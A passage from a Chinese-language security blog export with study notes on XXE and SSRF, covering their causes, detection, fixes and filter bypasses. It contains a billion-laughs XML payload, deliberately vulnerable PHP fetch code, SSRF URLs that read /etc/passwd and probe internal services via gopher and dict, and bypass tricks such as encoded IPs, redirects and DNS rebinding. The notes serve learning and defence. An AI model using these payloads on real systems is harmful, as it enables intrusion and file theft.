attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>     ]>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span></code></pre><h2 id="0x05-判断XXE漏洞是否存在"><a href="#0x05-判断XXE漏洞是否存在" class="headerlink" title="0x05 判断XXE漏洞是否存在"></a>0x05 判断XXE漏洞是否存在</h2><ol><li>content-type: application/xml 这种就可以试试,也可以自己把content-type进行测试,有时候json接口也有可能会配有解析xml的接口</li><li>传送XML是否被解析</li><li>解析后探测是否支持外部实体<br>……</li></ol><h2 id="0x06漏洞修复"><a href="#0x06漏洞修复" class="headerlink" title="0x06漏洞修复"></a>0x06漏洞修复</h2><p>直接附上师傅们的总结:</p><h3 id="6-1禁用外部实体"><a href="#6-1禁用外部实体" class="headerlink" title="6.1禁用外部实体"></a>6.1禁用外部实体</h3><p>PHP：</p><blockquote><p>libxml_disable_entity_loader(true);</p></blockquote><p>JAVA:</p><blockquote><p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);<br>.setFeature(“<a href="http://apache.org/xml/features/disallow-doctype-decl&quot;,true" target="_blank" rel="noopener">http://apache.org/xml/features/disallow-doctype-decl&quot;,true</a>);<br>.setFeature(“<a href="http://xml.org/sax/features/external-general-entities&quot;,false" target="_blank" rel="noopener">http://xml.org/sax/features/external-general-entities&quot;,false</a>)<br>.setFeature(“<a href="http://xml.org/sax/features/external-parameter-entities&quot;,false" target="_blank" rel="noopener">http://xml.org/sax/features/external-parameter-entities&quot;,false</a>);</p></blockquote><p>Python：</p><blockquote><p>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p></blockquote><h3 id="6-2-黑名单过滤"><a href="#6-2-黑名单过滤" class="headerlink" title="6.2 黑名单过滤"></a>6.2 黑名单过滤</h3><p>过滤:</p><pre><code>&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC</code></pre><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>这次xxe学习属实是丰富了一波自己的知识储备,在此之前XXE对我来说是一片空白,是属于有点鸡肋的漏洞,远远不如SQL,RCE等,这些天通过ssrf和xxe发现,由于协议的支持,这些漏洞虽然达不到超越上面这些漏洞程度,但是可以比肩,确实是没有那种类型的漏洞是鸡肋的,只不过是自己发掘不出来罢了.十分认可k0rz3n师傅的在文章提的一句话</p><blockquote><p>你的知识面,决定着你的攻击面</p></blockquote><h2 id="0x08-PS-思维导图"><a href="#0x08-PS-思维导图" class="headerlink" title="0x08 PS:思维导图"></a>0x08 PS:思维导图</h2><p>自己画了个思维导图,主要是php方面,java不熟悉……<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200328172331.png" alt></p><h2 id="0x09-参考文章"><a href="#0x09-参考文章" class="headerlink" title="0x09 参考文章"></a>0x09 参考文章</h2><p><a href="https://xz.aliyun.com/t/3357#toc-15" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-15</a><br><a href="https://xz.aliyun.com/t/6754#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6754#toc-8</a><br><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a><br><a href="http://rui0.cn/archives/993" target="_blank" rel="noopener">http://rui0.cn/archives/993</a><br><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a><br><a href="https://www.smi1e.top/dsada/" target="_blank" rel="noopener">https://www.smi1e.top/dsada/</a><br><a href="https://hpdoger.cn/2019/01/07/%E4%BB%8E%E4%B8%A4%E9%81%93CTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0XXE%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://hpdoger.cn/2019/01/07/%E4%BB%8E%E4%B8%A4%E9%81%93CTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0XXE%E6%BC%8F%E6%B4%9E/</a><br><a href="https://myzxcg.github.io/20171106.html" target="_blank" rel="noopener">https://myzxcg.github.io/20171106.html</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> XXE漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf学习笔记（持续更新……）</title>
      <link href="/3755095433.html"/>
      <url>/3755095433.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这是一篇菜鸟web手的ssrf学习笔记，有关ssrf的知识都会放在这里，持续更新ing……</p><h2 id="0x02-漏洞介绍"><a href="#0x02-漏洞介绍" class="headerlink" title="0x02 漏洞介绍"></a>0x02 漏洞介绍</h2><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><h2 id="0x03-漏洞函数"><a href="#0x03-漏洞函数" class="headerlink" title="0x03 漏洞函数"></a>0x03 漏洞函数</h2><p>ssrf有三种类型，分别是由<code>curl_exec()、file_get_contens（）、fsockopen()</code>漏洞的基本形式如下</p><p>curl_exec():</p><pre class=" language-php"><code class="language-php"><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>file_get_contents():</p><pre class=" language-php"><code class="language-php">     <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>fsockopen()：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GetFile</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"$errstr (error number $errno) \n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>         <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">"GET $link HTTP/1.1\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Host: $host\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"\r\n"</span><span class="token punctuation">;</span>         <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             <span class="token variable">$contents</span><span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><h2 id="0x04-可利用协议"><a href="#0x04-可利用协议" class="headerlink" title="0x04 可利用协议"></a>0x04 可利用协议</h2><p>ssrf的危害大多是来自于其对于各种协议的支持，其中以curl_exec为最，几乎支持各种协议，其次是file_get_contens，最后的fsockopen几乎就不支持仍和协议了。</p><p>先附上一波各语言ssrf可以利用的协议：<br><img src="/3755095433/1.jpg" alt></p><p>从图中也可以看出curl支持的协议是最多的，而php其次，但是php仍带有一些封装协议可以利用。需要提一下windows可利用的curl协议要比linux少很多。本地测试的不一定对，gopher就不支持</p><p>最为常见的协议为下面这些</p><blockquote><p> file://        //File协议⽤于访问本地⽂件<br> http://  https://        //http和https⽤于访问互联⽹⽂件<br> dict://        //dict协议是⼀个字典服务器协议，<br> gopher://        //ssrf中的最强协议，其最⼤优点就在于可以发送各种格式的请求。<br> smtp://  pop3://  imap://        //常⻅的邮件协议 ，可以用来爆破邮件的用户名和密码<br> ftp://  tftp://        //⽂件传输协议，若有未授权则可以直接读取⽂件 ，也可爆破<br> php://        //⽤php伪协议可读取⽂件<br> phar://        //触发反序列化</p></blockquote><p>协议这方面触及的不多，可能会单独写文章进行总结，gopher肯定是要详细谢谢的，太强大了</p><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><p>ssrf利用面是真的广，基本什么都能做，大题为下面三类</p><h3 id="6-1-内网应用攻击"><a href="#6-1-内网应用攻击" class="headerlink" title="6.1 内网应用攻击"></a>6.1 内网应用攻击</h3><p>内网攻击算是ssrf最NP的地方了，其中最出名的就是ssrf配合redis数据库getshell，多是利用gopher协议，由于篇幅我会在gopher里面详解。<br>其次就是内网服务探测了，主要是利用<code>dict://、ftp://、http://、telnet://</code>等协议尽心探测</p><h3 id="6-2-任意文件读取"><a href="#6-2-任意文件读取" class="headerlink" title="6.2 任意文件读取"></a>6.2 任意文件读取</h3><p>SSRF其实也可以分为有无回显两种，在文件读取这个地方提一下，文件读取就是file://协议了</p><h4 id="6-2-1有回显"><a href="#6-2-1有回显" class="headerlink" title="6.2.1有回显"></a>6.2.1有回显</h4><h5 id="6-2-1-1-完全回显SSRF"><a href="#6-2-1-1-完全回显SSRF" class="headerlink" title="6.2.1.1 完全回显SSRF"></a>6.2.1.1 完全回显SSRF</h5><p>直接利用请求，然后根据回显判断<br><code>http://localhost/ssrf.php?url=file:///etc/passwd</code><br><code>http://localhost.com/ssrf.php?url=file:///C:/Windows/win.ini</code><br>其他协议利用方式：</p><pre><code>gophergopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_testdicthttp://127.0.0.1/ssrf.php?url=dict://127.0.0.1:port/infohttphttp://127.0.0.1/ssrf.php?url=http://xxx.com/302.php</code></pre><p>直接根据回显内容和状态判读即可</p><h5 id="6-2-1-2BOOL型ssrf"><a href="#6-2-1-2BOOL型ssrf" class="headerlink" title="6.2.1.2BOOL型ssrf"></a>6.2.1.2BOOL型ssrf</h5><p>上面的会完整的显示回显信息，但是还以一种则只会返回True or False。这种要想读取文件就需要考虑OOB了，目前木的思路，如何进行oob</p><p>需要注意的是即使返回true，payload也不一定执行成功。</p><h4 id="6-3-2无回显"><a href="#6-3-2无回显" class="headerlink" title="6.3.2无回显"></a>6.3.2无回显</h4><p>无回显就只能通过在vps上通过监听，进行测试</p><h3 id="6-3-Dos"><a href="#6-3-Dos" class="headerlink" title="6.3 Dos"></a>6.3 Dos</h3><p>请求大文件，始终保持连接Keep-Alive Always</p><h2 id="0x06-漏洞常见的出现场景"><a href="#0x06-漏洞常见的出现场景" class="headerlink" title="0x06 漏洞常见的出现场景"></a>0x06 漏洞常见的出现场景</h2><p>直接先上某大佬的一张脑图和大佬们的总结，感觉总结的已经很完整了，就不班门弄斧了，还得多实践。总结一句话就是一切需要有url的地方都可能存在<br><img src="/3755095433/6.png" alt></p><blockquote><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞<br>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol></blockquote><h2 id="0x07-漏洞防御"><a href="#0x07-漏洞防御" class="headerlink" title="0x07 漏洞防御"></a>0x07 漏洞防御</h2><ol><li>协议禁用，只允许http和https</li><li>黑名单过滤，禁止访问内网ip</li><li>端口限制</li><li>白名单，设置只可访问的url</li><li>禁止跳转，防止利用url跳转进行绕过</li><li>感觉也可以做一些符号过滤如@</li></ol><p>这是我能想到的，看其他师傅们还有两种方法<br>一种是对过滤返回信息，还有就是统一错误信息<br>第一种是在把返回结果给用户之前进行一次检验，后一种则是防止用户可以根据错误信息来判断远端服务器的端口状态</p><h2 id="0x08-bypass姿势"><a href="#0x08-bypass姿势" class="headerlink" title="0x08 bypass姿势"></a>0x08 bypass姿势</h2><p>通过上面的防御方式，其实也能看出来一下bypass的姿势</p><h3 id="8-1绕过姿势"><a href="#8-1绕过姿势" class="headerlink" title="8.1绕过姿势"></a>8.1绕过姿势</h3><h4 id="8-1-1-特殊地址"><a href="#8-1-1-特殊地址" class="headerlink" title="8.1.1 特殊地址"></a>8.1.1 特殊地址</h4><ol><li>[::]<br>利用的应该是ipv6，windows本机测试失败，linux服务器可能是网卡问题提示网络问题，应该在linuz服务器上是可以用的</li><li><a href="http://0/" target="_blank" rel="noopener">http://0/</a><br>等同于127.0.0.1，windows失败，linux成功<h4 id="8-1-2-绕过"><a href="#8-1-2-绕过" class="headerlink" title="8.1.2 @绕过"></a>8.1.2 @绕过</h4>下面会有详细介绍<h4 id="8-1-3-利用Enclosed-alphanumerics（封闭式字符数字）绕过"><a href="#8-1-3-利用Enclosed-alphanumerics（封闭式字符数字）绕过" class="headerlink" title="8.1.3 利用Enclosed alphanumerics（封闭式字符数字）绕过"></a>8.1.3 利用Enclosed alphanumerics（封闭式字符数字）绕过</h4>应该时编码的问题，同样windows失败，linux成功<pre><code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre><h4 id="8-1-4-句号绕过"><a href="#8-1-4-句号绕过" class="headerlink" title="8.1.4 句号绕过"></a>8.1.4 句号绕过</h4>windows失败，linux成功</li></ol><p><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></p><h4 id="8-1-5-短地址绕过"><a href="#8-1-5-短地址绕过" class="headerlink" title="8.1.5 短地址绕过"></a>8.1.5 短地址绕过</h4><p>可以利用短地址绕过一些限制</p><h4 id="8-1-6-利用特殊DNS解析绕过"><a href="#8-1-6-利用特殊DNS解析绕过" class="headerlink" title="8.1.6 利用特殊DNS解析绕过"></a>8.1.6 利用特殊DNS解析绕过</h4><p>.xip.io这个解析服务器会把IP地址+.xio.io全返回到IP地址，无论前面有多少级子域名</p><pre><code>          10.0.0.1.xip.io   resolves to   10.0.0.1      www.10.0.0.1.xip.io   resolves to   10.0.0.1   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1</code></pre><h4 id="8-1-7-进制转换绕过"><a href="#8-1-7-进制转换绕过" class="headerlink" title="8.1.7 进制转换绕过"></a>8.1.7 进制转换绕过</h4><p>我们访问域名实际上是访问域名所对应的ip地址，这些ip地址⼀般都是点分⼗进制，我们可以将其转化为⼗进制整数或者⼗六进制或者⼋进制点分和十六进制点分。转换脚本如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">ip2decimalism</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>     dec_value <span class="token operator">=</span> <span class="token number">0</span>     v_list<span class="token operator">=</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>             v_list<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>             t<span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">for</span> v <span class="token keyword">in</span> v_list<span class="token punctuation">:</span>                    dec_value <span class="token operator">+=</span> int<span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">*</span> t                    t <span class="token operator">=</span> t <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">8</span><span class="token punctuation">)</span>           <span class="token keyword">return</span> dec_value<span class="token keyword">def</span> <span class="token function">ip2hex</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>            ip_list<span class="token operator">=</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>            hex_ip<span class="token operator">=</span><span class="token string">"0x"</span>            <span class="token keyword">for</span> ip_num <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>                    hex_data<span class="token operator">=</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>ip_num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>hex_data<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            hex_ip<span class="token operator">=</span>hex_ip<span class="token operator">+</span><span class="token string">"0"</span><span class="token operator">+</span>hex_data                    <span class="token keyword">else</span><span class="token punctuation">:</span>                            hex_ip<span class="token operator">=</span>hex_ip<span class="token operator">+</span>hex_data             <span class="token keyword">return</span> hex_ip<span class="token keyword">def</span> <span class="token function">ip2oct</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>            ip_list<span class="token operator">=</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>            oct_ip<span class="token operator">=</span><span class="token string">''</span>            <span class="token keyword">for</span> ip_num <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>                    oct_data<span class="token operator">=</span><span class="token string">"0"</span><span class="token operator">+</span>oct<span class="token punctuation">(</span>int<span class="token punctuation">(</span>ip_num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    oct_ip<span class="token operator">+=</span>oct_data<span class="token operator">+</span><span class="token string">"."</span>            <span class="token keyword">return</span> oct_ip<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    ip<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex ip is: "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ip2hex<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"int ip is: "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ip2decimalism<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"oct ip is: "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ip2oct<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="8-1-8-利用非http协议绕过"><a href="#8-1-8-利用非http协议绕过" class="headerlink" title="8.1.8 利用非http协议绕过"></a>8.1.8 利用非http协议绕过</h4><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p><h4 id="8-1-9-利用302跳转绕过"><a href="#8-1-9-利用302跳转绕过" class="headerlink" title="8.1.9 利用302跳转绕过"></a>8.1.9 利用302跳转绕过</h4><p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中。<br>demo:</p><pre><code>&lt;?php  $url = $_GET[&#39;u&#39;];header(&quot;Location: $url&quot;); </code></pre><h4 id="8-1-10-DNS-Rebinding绕过"><a href="#8-1-10-DNS-Rebinding绕过" class="headerlink" title="8.1.10 DNS Rebinding绕过"></a>8.1.10 DNS Rebinding绕过</h4><blockquote><p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p></blockquote><p>看这个图：<br><img src="https://img-blog.csdnimg.cn/20191011171513668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MTAxMDQ5,size_16,color_FFFFFF,t_70" alt><br>从图中可以看出来请求的流程：</p><ol><li>当用户请求一个url时，会先向获取一个host</li><li>对host进行DNS解析,返回一个IP(此时的DNS服务器可能是本地,也可能是其他的)</li><li>判断IP是否合法</li><li>合法的话会再去进行一次DNS解析</li></ol><p>首要条件就是要TTL为0,即DNS记录在DNS服务器上缓存时间为0,等于无缓存.这样我们只需要设置两个解析,其中一个为内网地址,就可能会绕过内网的限制,但是有点拼几率.还有一种方式是通过ns记录解析到一个子域名,然后再把子域名解析到内网ip,这样的话就能直接到内网.</p><h3 id="8-2-具体场景的绕过"><a href="#8-2-具体场景的绕过" class="headerlink" title="8.2 具体场景的绕过"></a>8.2 具体场景的绕过</h3><h4 id="8-2-1-限制为http-www-xxx-com-域名时"><a href="#8-2-1-限制为http-www-xxx-com-域名时" class="headerlink" title="8.2.1 限制为http://www.xxx.com 域名时"></a>8.2.1 限制为<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> 域名时</h4><p>先放一张图 url的组成<br><img src="https://legoc.github.io/2018/09/08/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/1.jpg" alt><br>通过可以看到一般URL会通过@来区分用户名和域名，这样我们就可以通过@来绕过域名的限制，不同的处理函数处理机制是不一样的，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的，再就是filter_var的限定，可以用data://绕过，主要是因为filter_var()函数对于<a href="http://evil.com;google.com" target="_blank" rel="noopener">http://evil.com;google.com</a> 会返回false也就是认为url格式错误，但是对于0://evil.com:80;google.com:80/ 、0://evil.com:80,google.com:80/、0://evil.com:80\google.com:80/却返回true</p><h3 id="8-2-2-限制请求IP不为内网地址"><a href="#8-2-2-限制请求IP不为内网地址" class="headerlink" title="8.2.2 限制请求IP不为内网地址"></a>8.2.2 限制请求IP不为内网地址</h3><ol><li>短网址绕过</li><li>使用可以指向任意域名的xip.io，127.0.0.1.xip.io，可以解析为127.0.0.1</li><li>进制转换，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433</li></ol><h3 id="8-2-3限制请求只为http协议"><a href="#8-2-3限制请求只为http协议" class="headerlink" title="8.2.3限制请求只为http协议"></a>8.2.3限制请求只为http协议</h3><ol><li>url跳转</li><li>短地址</li></ol><h2 id="0x09-PS-思维导图"><a href="#0x09-PS-思维导图" class="headerlink" title="0x09 PS:思维导图"></a>0x09 PS:思维导图</h2><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200331001952.png" alt></p><h2 id="0x10-参考文章"><a href="#0x10-参考文章" class="headerlink" title="0x10 参考文章"></a>0x10 参考文章</h2><p><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">了解SSRF,这一篇就足够了</a></p><p><a href="https://zhengbao.wang/SSRF%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">SSRF的一些利用姿势</a><br><a href="https://xz.aliyun.com/t/6373" target="_blank" rel="noopener">https://xz.aliyun.com/t/6373</a><br><a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/65832.html</a><br><a href="https://blog.csdn.net/qq_39101049/article/details/102501839s" target="_blank" rel="noopener">https://blog.csdn.net/qq_39101049/article/details/102501839s</a><br><a href="https://zhuanlan.zhihu.com/p/89426041" 